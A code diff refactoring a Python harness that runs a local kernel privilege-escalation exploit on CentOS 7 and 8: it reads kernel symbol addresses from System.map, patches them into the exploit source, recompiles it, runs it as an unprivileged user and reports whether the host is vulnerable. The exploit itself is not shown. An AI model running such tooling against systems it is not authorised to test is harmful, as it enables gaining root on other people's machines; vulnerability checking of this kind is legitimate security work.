@@ -35,7 +35,7 @@ sub_uname = subprocess.run(['uname', '-r'], stdout=subprocess.PIPE)
 version = sub_uname.stdout.decode("utf-8").rstrip()
 elversion = version.split(".")[len(version.split(".")) - 2]
 depriv_user = None
-sysmap = "/boot/System.map-{}".format(version)
+sysmap = f"/boot/System.map-{version}"
 exploit_setup = False
 
 def is_root():
@@ -63,16 +63,15 @@ def recompile():
             new_lines.append(inject + "\n")
         else:
             new_lines.append(line)
-    symbols = open("symbols.c", "w")
-    symbols.writelines(new_lines)
-    symbols.close()
+    with open("symbols.c", "w") as symbols:
+        symbols.writelines(new_lines)
     return True
 
 def setup_exploit(add_symbols=False):
     global exploit_setup
     files = ["a.sh", "exploit.c", "Makefile"]  # Check if some of the files exist
     for file in files:
-        p = Path("./{}".format(file))
+        p = Path(f"./{file}")
         if not p.is_file():
             return False
     if add_symbols:
@@ -86,13 +85,12 @@ def setup_exploit(add_symbols=False):
 def run_exploit():
     # We're root, so run as a deprivileged user
     sub = subprocess.run(["su", "-c", "./exploit", depriv_user], stdout=subprocess.PIPE)
-    res = sub.stdout.decode("utf-8").rstrip()
-    return res
+    return sub.stdout.decode("utf-8").rstrip()
 
 def check(vers="Unknown Version"):
     global symbol_mem
     global symbol_touser
-    print("{} detected, checking for symbols".format(vers))
+    print(f"{vers} detected, checking for symbols")
     if vers != "CentOS 8" or vers.startswith("CentOS 8"):
         print("Recompiling to add symbol offsets")
         setup_exploit(add_symbols=True)
@@ -109,7 +107,7 @@ def check(vers="Unknown Version"):
     print("Found all the symbols")
     success = False
     res = None
-    for i in range(0, 20 if "-fast" not in sys.argv else 3):
+    for _ in range(20 if "-fast" not in sys.argv else 3):
         res = run_exploit()
         if res.endswith("Success"):
             success = True
@@ -142,12 +140,14 @@ if __name__ == '__main__':
         recompile()
         quit()
     if elversion == "el8" or elversion.startswith("el8"):
-        num = "8"
-        if elversion != "el8" and "_" in elversion:
-            num = "8." + elversion.split("_")[1]
-        if check(vers="CentOS {}".format(num)):
-            verified = verify_success()
-            if verified:
+        num = (
+            "8." + elversion.split("_")[1]
+            if elversion != "el8" and "_" in elversion
+            else "8"
+        )
+
+        if check(vers=f"CentOS {num}"):
+            if verified := verify_success():
                 print("Vulnerable!")
             else:
                 print("Exploit ran, but was unable to verify that it worked")
@@ -155,15 +155,12 @@ if __name__ == '__main__':
             print("Not vulnerable!")
     elif elversion == "el7":
         if check(vers="CentOS 7"):
-            verified = verify_success()
-            if verified:
+            if verified := verify_success():
                 print("Vulnerable!")
             else:
                 print("Exploit ran, but was unable to verify that it worked")
         else:
             print("Not vulnerable!")
-    else:
-        success = check()
-        if success:
-            print("Found memory symbols")
+    elif success := check():
+        print("Found memory symbols")
     verify_success()
